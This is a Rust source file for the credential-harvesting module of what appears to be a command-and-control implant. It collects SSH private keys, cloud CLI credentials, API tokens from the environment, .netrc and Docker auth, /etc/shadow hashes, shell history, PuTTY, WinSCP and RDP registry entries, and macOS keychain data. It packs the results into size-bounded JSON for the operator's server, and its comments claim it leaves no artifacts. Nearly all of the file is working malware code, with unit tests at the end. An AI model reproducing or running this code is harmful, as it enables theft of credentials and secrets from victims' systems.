//! Cross-platform credential harvesting.
//!
//! Operator surface is `nw/creds` (optionally `nw/creds <source>` to limit to
//! one harvester). The implant walks each platform's *reachable* credential
//! stores and returns the material as a JSON array on stdout so the server can
//! parse it into its credential store.
//!
//! ## What this collects, by platform
//!
//! **All platforms** — environment-borne API/cloud tokens, SSH private keys,
//! cloud CLI credential files (`~/.aws/credentials`, `~/.config/gcloud`,
//! `~/.azure`), `~/.netrc`, Docker config auth.
//!
//! **Linux** — `/etc/passwd` (enumeration), `/etc/shadow` (hashes, when the
//! beacon is root), shell history.
//!
//! **Windows** — registry-stored credential material for PuTTY, WinSCP and
//! RDP saved hosts.
//!
//! **macOS** — login keychain items via the `security` CLI.
//!
//! ## Boundary
//!
//! This does not implement Mimikatz's LSASS / SAM / DPAPI / Kerberos internals.
//! Those live behind `lsass.exe` memory layouts and Windows credential-provider
//! internals that are large, version-sensitive, and only meaningful at SYSTEM.
//! This harvests the credential material a beacon can actually reach with its
//! own privileges, which on a default host includes SSH keys, cloud files, and
//! saved-application registry values. ponytail: collect what is reachable now;
//! add LSASS only if you have a target where it is the only path.
//!
//! ## Evasion posture
//!
//! Harvesting reads files and the registry and shells out to `security` on
//! macOS; it writes nothing to disk and touches no Windows credential provider,
//! so it leaves no artifacts. Telemetry suppression (ETW/AMSI) is the
//! implant's existing job via [`crate::evasion`], not duplicated here.

pub use nw_profile::creds::Harvested;

use std::path::PathBuf;

/// Parse `~/.aws/credentials`-style INI into (profile, key, value) triples.
pub fn parse_ini_credentials(text: &str) -> Vec<(String, String, String)> {
    let mut out = Vec::new();
    let mut profile = String::from("default");
    for line in text.lines() {
        let line = line.trim();
        if line.is_empty() || line.starts_with('#') || line.starts_with(';') {
            continue;
        }
        if let Some(name) = line.strip_prefix('[').and_then(|l| l.strip_suffix(']')) {
            profile = name.trim().to_owned();
            continue;
        }
        if let Some((key, value)) = line.split_once('=') {
            out.push((
                profile.clone(),
                key.trim().to_owned(),
                value.trim().to_owned(),
            ));
        }
    }
    out
}

/// Extract logins and passwords from a `~/.netrc` file.
///
/// Handles `machine`/`default` stanzas, `login`/`user`/`account` and
/// `password`. Returns `(login, password)` pairs in file order.
pub fn parse_netrc(text: &str) -> Vec<(String, String)> {
    let tokens: Vec<&str> = text.split_ascii_whitespace().collect();
    let mut out = Vec::new();
    let mut i = 0usize;
    let mut login: Option<String> = None;
    let mut password: Option<String> = None;

    let flush = |out: &mut Vec<(String, String)>,
                 login: &mut Option<String>,
                 password: &mut Option<String>| {
        if let (Some(l), Some(p)) = (login.take(), password.take()) {
            out.push((l, p));
        }
    };

    while i < tokens.len() {
        match tokens[i] {
            "machine" => {
                flush(&mut out, &mut login, &mut password);
                i += 2; // skip the machine name
            }
            "default" => {
                flush(&mut out, &mut login, &mut password);
                i += 1;
            }
            "login" | "user" | "account" => {
                if i + 1 < tokens.len() {
                    login = Some(tokens[i + 1].to_owned());
                    i += 2;
                } else {
                    i += 1;
                }
            }
            "password" => {
                if i + 1 < tokens.len() {
                    password = Some(tokens[i + 1].to_owned());
                    i += 2;
                } else {
                    i += 1;
                }
            }
            "macdef" => i += 2,
            _ => i += 1,
        }
    }
    flush(&mut out, &mut login, &mut password);
    out
}

/// True if a file looks like an SSH private key body.
pub fn is_private_key(text: &str) -> bool {
    let head = text.trim_start();
    head.starts_with("-----BEGIN") && head.contains("PRIVATE KEY-----")
}

/// Classify an SSH key filename (id_rsa, id_ed25519, mykey, ...).
pub fn ssh_key_kind(file_name: &str) -> Option<&'static str> {
    let name = file_name.trim();
    if name.ends_with(".pub") {
        return None;
    }
    Some(match name {
        "id_rsa" => "rsa",
        "id_dsa" => "dsa",
        "id_ecdsa" => "ecdsa",
        "id_ed25519" => "ed25519",
        _ => "generic",
    })
}

/// Pull a `user:token` or `auth` value out of a Docker config JSON.
pub fn parse_docker_auth(text: &str) -> Option<(String, String)> {
    let value: serde_json::Value = serde_json::from_str(text).ok()?;
    let auths = value.get("auths")?.as_object()?;
    use base64::Engine;
    for (registry, entry) in auths {
        // Skip registries with no auth blob rather than abandoning the search.
        let Some(auth) = entry.get("auth").and_then(|v| v.as_str()) else {
            continue;
        };
        let Ok(decoded) = base64::engine::general_purpose::STANDARD.decode(auth) else {
            continue;
        };
        let Ok(decoded) = String::from_utf8(decoded) else {
            continue;
        };
        if let Some((user, pass)) = decoded.split_once(':') {
            return Some((registry.clone(), format!("{user}:{pass}")));
        }
    }
    None
}

/// Names of environment variables that commonly carry live secrets.
pub const SECRET_ENV_VARS: &[&str] = &[
    "AWS_ACCESS_KEY_ID",
    "AWS_SECRET_ACCESS_KEY",
    "AWS_SESSION_TOKEN",
    "AZURE_CLIENT_ID",
    "AZURE_CLIENT_SECRET",
    "AZURE_TENANT_ID",
    "GOOGLE_APPLICATION_CREDENTIALS",
    "GCP_ACCESS_TOKEN",
    "GITHUB_TOKEN",
    "GH_TOKEN",
    "GITLAB_TOKEN",
    "NPM_TOKEN",
    "DOCKER_AUTH_TOKEN",
    "OPENAI_API_KEY",
    "ANTHROPIC_API_KEY",
    "SLACK_TOKEN",
    "PGPASSWORD",
    "DB_PASSWORD",
];

/// Harvest every secret-bearing environment variable set in this process.
pub fn harvest_env() -> Vec<Harvested> {
    SECRET_ENV_VARS
        .iter()
        .filter_map(|name| std::env::var(name).ok().map(|value| (*name, value)))
        .filter(|(_, value)| !value.is_empty())
        .map(|(name, value)| Harvested::new("environment", "api-token", name, value))
        .collect()
}

fn home_dir() -> Option<PathBuf> {
    #[cfg(windows)]
    {
        std::env::var("USERPROFILE").ok().map(PathBuf::from)
    }
    #[cfg(not(windows))]
    {
        std::env::var("HOME").ok().map(PathBuf::from)
    }
}

/// Harvest SSH private keys from the home directory.
pub fn harvest_ssh_keys() -> Vec<Harvested> {
    let mut out = Vec::new();
    let Some(home) = home_dir() else {
        return out;
    };
    let ssh_dir = home.join(".ssh");
    let Ok(entries) = std::fs::read_dir(&ssh_dir) else {
        return out;
    };
    for entry in entries.flatten() {
        let path = entry.path();
        let Some(name) = path.file_name().and_then(|n| n.to_str()) else {
            continue;
        };
        let Some(kind) = ssh_key_kind(name) else {
            continue;
        };
        if let Ok(text) = std::fs::read_to_string(&path)
            && is_private_key(&text)
        {
            out.push(Harvested::new(
                "ssh-key",
                &format!("private-key-{kind}"),
                path.display().to_string(),
                text,
            ));
        }
    }
    out
}

/// Harvest cloud-CLI credential files from the home directory.
pub fn harvest_cloud_files() -> Vec<Harvested> {
    let mut out = Vec::new();
    let Some(home) = home_dir() else {
        return out;
    };

    let aws = home.join(".aws/credentials");
    if let Ok(text) = std::fs::read_to_string(&aws) {
        for (profile, key, value) in parse_ini_credentials(&text) {
            out.push(Harvested::new(
                "cloud-aws",
                "credential",
                format!("{profile}/{key}"),
                value,
            ));
        }
    }

    let gcloud = home.join(".config/gcloud/credentials.db");
    if gcloud.exists() {
        out.push(Harvested::new(
            "cloud-gcloud",
            "credential-file",
            gcloud.display().to_string(),
            "",
        ));
    }

    let azure = home.join(".azure");
    if let Ok(entries) = std::fs::read_dir(&azure) {
        for entry in entries.flatten() {
            let path = entry.path();
            if let Ok(text) = std::fs::read_to_string(&path)
                && !text.is_empty()
            {
                out.push(Harvested::new(
                    "cloud-azure",
                    "credential",
                    path.display().to_string(),
                    text,
                ));
            }
        }
    }

    out
}

/// Harvest `~/.netrc` and Docker registry auth.
pub fn harvest_misc_files() -> Vec<Harvested> {
    let mut out = Vec::new();
    let Some(home) = home_dir() else {
        return out;
    };

    let netrc = home.join(".netrc");
    if let Ok(text) = std::fs::read_to_string(&netrc) {
        for (login, password) in parse_netrc(&text) {
            out.push(Harvested::new("netrc", "password", login, password));
        }
    }

    let docker = home.join(".docker/config.json");
    if let Ok(text) = std::fs::read_to_string(&docker)
        && let Some((registry, auth)) = parse_docker_auth(&text)
    {
        out.push(Harvested::new("docker", "registry-auth", registry, auth));
    }

    out
}

/// Harvest platform-specific credential stores (SAM-adjacent material).
fn harvest_platform() -> Vec<Harvested> {
    #[cfg(target_os = "linux")]
    {
        linux::harvest()
    }
    #[cfg(target_os = "windows")]
    {
        windows::harvest()
    }
    #[cfg(target_os = "macos")]
    {
        macos::harvest()
    }
    #[cfg(not(any(target_os = "linux", target_os = "windows", target_os = "macos")))]
    {
        Vec::new()
    }
}

/// Harvest every reachable credential and render the result as JSON.
///
/// `source` optionally limits harvesting to a single named source (e.g.
/// `ssh-key`). `None` or empty harvests everything.
pub fn harvest(source: Option<&str>) -> Vec<Harvested> {
    let want = |name: &str| source.is_none_or(|s| s.eq_ignore_ascii_case(name));
    let mut out = Vec::new();

    if want("environment") {
        out.extend(harvest_env());
    }
    if want("ssh-key") {
        out.extend(harvest_ssh_keys());
    }
    if want("cloud") {
        out.extend(harvest_cloud_files());
    }
    if want("misc") {
        out.extend(harvest_misc_files());
    }
    if want("platform") || source.is_none() {
        out.extend(harvest_platform());
    }
    out
}

/// Per-credential secret cap, so one large key/blob cannot dominate the payload.
const MAX_SECRET_BYTES: usize = 4096;

/// Render harvested credentials as a JSON array for the task stdout.
pub fn to_json(creds: &[Harvested]) -> String {
    serde_json::to_string_pretty(creds).unwrap_or_else(|_| "[]".to_owned())
}

/// Serialize creds to JSON bounded by `max_bytes`.
///
/// A completed task's stdout rides the next poll as fixed payload that cannot
/// be truncated (unlike file chunks), so an oversized `nw/creds` result would
/// overflow the sealed-wire budget and the result would never be delivered.
/// Each credential's secret is halved until it fits; a credential's presence,
/// source and identifier are kept even when its secret is too large.
pub fn to_json_bounded(creds: &[Harvested], max_bytes: usize) -> String {
    // Compact serialization so the length estimate equals the output length.
    let mut kept: Vec<Harvested> = Vec::new();
    let mut used = 2usize; // the enclosing "[" and "]"

    for cred in creds {
        let mut trimmed = cred.clone();
        if trimmed.secret.len() > MAX_SECRET_BYTES {
            trimmed.secret.truncate(MAX_SECRET_BYTES);
            trimmed.secret.push_str("...[truncated]");
        }
        let sep = usize::from(!kept.is_empty());

        loop {
            let item_len = serde_json::to_string(&trimmed)
                .map(|s| s.len())
                .unwrap_or(usize::MAX);
            if used + item_len + sep <= max_bytes {
                used += item_len + sep;
                kept.push(trimmed);
                break;
            }
            // Shrink the secret rather than dropping the whole credential.
            if trimmed.secret.len() <= 16 {
                // Even a minimal entry does not fit; stop here.
                break;
            }
            // Halve the secret and re-mark it so the operator can tell the
            // material is partial rather than complete.
            trimmed.secret.truncate(trimmed.secret.len() / 2);
            trimmed.secret.push_str("[cut]");
        }
    }

    serde_json::to_string(&kept).unwrap_or_else(|_| "[]".to_owned())
}

// ---------------------------------------------------------------------------
// Linux
// ---------------------------------------------------------------------------

#[cfg(target_os = "linux")]
mod linux {
    use super::*;

    pub(super) fn harvest() -> Vec<Harvested> {
        let mut out = Vec::new();
        if let Ok(passwd) = std::fs::read_to_string("/etc/passwd") {
            for line in passwd.lines() {
                let fields: Vec<&str> = line.split(':').collect();
                if fields.len() >= 3 && !fields[2].is_empty() {
                    out.push(Harvested::new("passwd", "user-enum", fields[0], fields[2]));
                }
            }
        }
        // /etc/shadow holds hashes and is root-only.
        if let Ok(shadow) = std::fs::read_to_string("/etc/shadow") {
            for line in shadow.lines() {
                let fields: Vec<&str> = line.split(':').collect();
                if fields.len() >= 2 && !fields[1].is_empty() && fields[1] != "*" {
                    out.push(Harvested::new(
                        "shadow",
                        "password-hash",
                        fields[0],
                        fields[1],
                    ));
                }
            }
        }
        if let Some(home) = home_dir() {
            for name in [".bash_history", ".zsh_history"] {
                let path = home.join(name);
                if let Ok(text) = std::fs::read_to_string(&path) {
                    out.push(Harvested::new(
                        "shell-history",
                        "history",
                        path.display().to_string(),
                        text,
                    ));
                }
            }
        }
        out
    }
}

// ---------------------------------------------------------------------------
// Windows
// ---------------------------------------------------------------------------

#[cfg(target_os = "windows")]
mod windows {
    use super::*;
    use crate::registry::{self, Action, Hive};

    /// Read one registry value, reusing the credential module's access path.
    fn reg_value(hive: Hive, subkey: &str, name: &str) -> Option<String> {
        registry::execute(&Action::Query {
            hive,
            subkey: subkey.to_owned(),
            value: Some(name.to_owned()),
        })
        .ok()
        .map(|s| s.trim().to_owned())
        .filter(|s| !s.is_empty())
    }

    /// Enumerate subkeys of a key, returning their final path component.
    fn reg_subkeys(hive: Hive, subkey: &str) -> Vec<String> {
        registry::execute(&Action::Query {
            hive,
            subkey: subkey.to_owned(),
            value: None,
        })
        .ok()
        .map(|text| {
            text.lines()
                .filter_map(|l| l.strip_prefix('[').and_then(|l| l.strip_suffix(']')))
                .map(|s| s.to_owned())
                .collect()
        })
        .unwrap_or_default()
    }

    pub(super) fn harvest() -> Vec<Harvested> {
        let mut out = Vec::new();

        // PuTTY sessions keep ProxyPassword/UserName in plaintext-ish form.
        let putty = r"Software\SimonTatham\PuTTY\Sessions";
        for session in reg_subkeys(Hive::CurrentUser, putty) {
            let base = format!("{putty}\\{session}");
            for field in ["UserName", "ProxyUsername", "ProxyHost"] {
                if let Some(value) = reg_value(Hive::CurrentUser, &base, field) {
                    out.push(Harvested::new(
                        "registry-putty",
                        "saved-field",
                        format!("{session}/{field}"),
                        value,
                    ));
                }
            }
        }

        // RDP saved hosts (passwords are DPAPI-blobbed, so only the host is useful).
        let rdp = r"Software\Microsoft\Terminal Server Client\Servers";
        for host in reg_subkeys(Hive::CurrentUser, rdp) {
            out.push(Harvested::new("registry-rdp", "saved-host", host, ""));
        }

        // WinSCP saved sessions.
        let winscp = r"Software\Martin Prikryl\WinSCP 2\Sessions";
        for session in reg_subkeys(Hive::CurrentUser, winscp) {
            let base = format!("{winscp}\\{session}");
            for field in ["UserName", "HostName", "PortNumber"] {
                if let Some(value) = reg_value(Hive::CurrentUser, &base, field) {
                    out.push(Harvested::new(
                        "registry-winscp",
                        "saved-field",
                        format!("{session}/{field}"),
                        value,
                    ));
                }
            }
        }

        out
    }
}

// ---------------------------------------------------------------------------
// macOS
// ---------------------------------------------------------------------------

#[cfg(target_os = "macos")]
mod macos {
    use super::*;
    use std::process::Command;
    use std::time::Duration;

    /// Wall-clock ceiling for any `security` invocation. A keychain prompt or
    /// a locked keychain can block indefinitely, and a beacon task must never
    /// hang the poll loop.
    const SECURITY_TIMEOUT: Duration = Duration::from_secs(3);

    /// Run a blocking closure with a hard timeout, returning `None` on overrun.
    fn with_timeout<T: Send + 'static>(work: impl FnOnce() -> T + Send + 'static) -> Option<T> {
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let _ = tx.send(work());
        });
        rx.recv_timeout(SECURITY_TIMEOUT).ok()
    }

    pub(super) fn harvest() -> Vec<Harvested> {
        let mut out = Vec::new();

        // One non-prompting dump, bounded by a timeout.
        let dump = with_timeout(|| {
            let result = Command::new("security")
                .arg("dump-keychain")
                .output()
                .ok()?;
            if result.status.success() {
                String::from_utf8(result.stdout).ok()
            } else {
                None
            }
        })
        .flatten();

        if let Some(text) = dump {
            for service in parse_keychain_services(&text) {
                out.push(Harvested::new("keychain", "item", service, ""));
            }
        }

        // The login keychain file is present on any real profile.
        if let Some(home) = home_dir() {
            let login = home.join("Library/Keychains/login.keychain-db");
            if login.exists() {
                out.push(Harvested::new(
                    "keychain",
                    "keychain-file",
                    login.display().to_string(),
                    "",
                ));
            }
        }

        out
    }
}

/// Parse keychain service labels from a `security dump-keychain` dump.
///
/// Exposed so it is testable on any host.
pub fn parse_keychain_services(dump: &str) -> Vec<String> {
    let mut services = Vec::new();
    for line in dump.lines() {
        let Some(rest) = line.split("svce").nth(1) else {
            continue;
        };
        if let Some((_, tail)) = rest.split_once('=')
            && let Some(value) = tail.split('"').nth(1)
            && !value.is_empty()
            && !services.iter().any(|s: &String| s == value)
        {
            services.push(value.to_owned());
        }
    }
    services
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn ini_credentials_group_by_profile() {
        let text = "# comment\n[default]\naws_access_key_id = AKIA1\naws_secret_access_key = sec\n\n[dev]\nregion = eu-west-1\n";
        let parsed = parse_ini_credentials(text);
        assert_eq!(parsed.len(), 3);
        assert!(parsed.contains(&("default".into(), "aws_access_key_id".into(), "AKIA1".into())));
        assert!(parsed.contains(&("dev".into(), "region".into(), "eu-west-1".into())));
    }

    #[test]
    fn netrc_extracts_pairs() {
        let text = "machine example.com login alice password s3cret\nmachine other.com login bob password hunter2\n";
        let pairs = parse_netrc(text);
        assert_eq!(pairs.len(), 2);
        assert!(pairs.contains(&("alice".into(), "s3cret".into())));
        assert!(pairs.contains(&("bob".into(), "hunter2".into())));
    }

    #[test]
    fn ssh_key_kind_ignores_public_keys() {
        assert_eq!(ssh_key_kind("id_rsa"), Some("rsa"));
        assert_eq!(ssh_key_kind("id_ed25519"), Some("ed25519"));
        assert_eq!(ssh_key_kind("id_rsa.pub"), None);
        assert_eq!(ssh_key_kind("known_hosts"), Some("generic"));
    }

    #[test]
    fn private_key_detection() {
        assert!(is_private_key(
            "-----BEGIN RSA PRIVATE KEY-----\nMIIE...\n-----END RSA PRIVATE KEY-----"
        ));
        assert!(is_private_key("-----BEGIN OPENSSH PRIVATE KEY-----\n"));
        assert!(!is_private_key("ssh-rsa AAAAB3Nz..."));
    }

    #[test]
    fn docker_auth_decodes_base64_user_pass() {
        use base64::Engine;
        let encoded = base64::engine::general_purpose::STANDARD.encode("alice:pw");
        let json = format!(r#"{{"auths":{{"registry.io":{{"auth":"{encoded}"}}}}}}"#);
        let (registry, auth) = parse_docker_auth(&json).expect("parsed");
        assert_eq!(registry, "registry.io");
        assert_eq!(auth, "alice:pw");
        assert!(parse_docker_auth("not json").is_none());
    }

    #[test]
    fn bounded_json_respects_its_budget_and_trims_secrets() {
        // One oversized secret plus a few normal ones.
        let big: String = "A".repeat(MAX_SECRET_BYTES * 3);
        let creds = vec![
            Harvested::new("ssh-key", "private-key", "/a", big.clone()),
            Harvested::new("ssh-key", "private-key", "/b", "small"),
        ];
        let json = to_json_bounded(&creds, 600);
        assert!(json.len() <= 600, "budget exceeded: {} bytes", json.len());
        let back: Vec<Harvested> = serde_json::from_str(&json).expect("valid json");
        // Oversized secret trimmed, not dropped.
        let first = back.iter().find(|c| c.id == "/a").expect("/a kept");
        assert!(
            first.secret.contains("truncated") || first.secret.ends_with("[cut]"),
            "secret should be marked partial, got {} bytes",
            first.secret.len()
        );
        assert!(first.secret.len() < big.len());
    }

    #[test]
    fn bounded_json_drops_items_once_full() {
        let creds: Vec<Harvested> = (0..50)
            .map(|i| Harvested::new("environment", "api-token", format!("VAR{i}"), "value"))
            .collect();
        let json = to_json_bounded(&creds, 200);
        assert!(json.len() <= 200);
        let back: Vec<Harvested> = serde_json::from_str(&json).expect("valid json");
        assert!(back.len() < creds.len(), "should have dropped some");
    }

    #[test]
    fn harvested_round_trips_through_json() {
        let creds = vec![Harvested::new(
            "ssh-key",
            "private-key",
            "/root/.ssh/id_rsa",
            "KEY",
        )];
        let json = to_json(&creds);
        let back: Vec<Harvested> = serde_json::from_str(&json).expect("round-trips");
        assert_eq!(back, creds);
    }

    #[test]
    fn keychain_dump_parser_extracts_unique_services() {
        let dump = r#"
keychain: "/Users/x/Library/Keychains/login.keychain-db"
version: 512
class: 0x00000010
attributes:
    0x00000007 <blob>="svce"<blob>="WiFi"
    0x00000007 <blob>="acct"<blob>="lab"
    0x00000007 <blob>="svce"<blob>="github.com"
    0x00000007 <blob>="svce"<blob>="WiFi"
"#;
        let services = parse_keychain_services(dump);
        assert_eq!(services, vec!["WiFi".to_string(), "github.com".to_string()]);
    }

    #[test]
    fn harvest_by_source_limits_scope() {
        // ssh-key-only should not include environment or platform sources.
        let only_ssh = harvest(Some("ssh-key"));
        assert!(only_ssh.iter().all(|c| c.source == "ssh-key"));
    }

    #[test]
    fn harvest_env_finds_nothing_when_unset() {
        // We do not mutate the environment here; just assert the shape is valid.
        let env = harvest_env();
        for cred in &env {
            assert_eq!(cred.source, "environment");
        }
    }
}
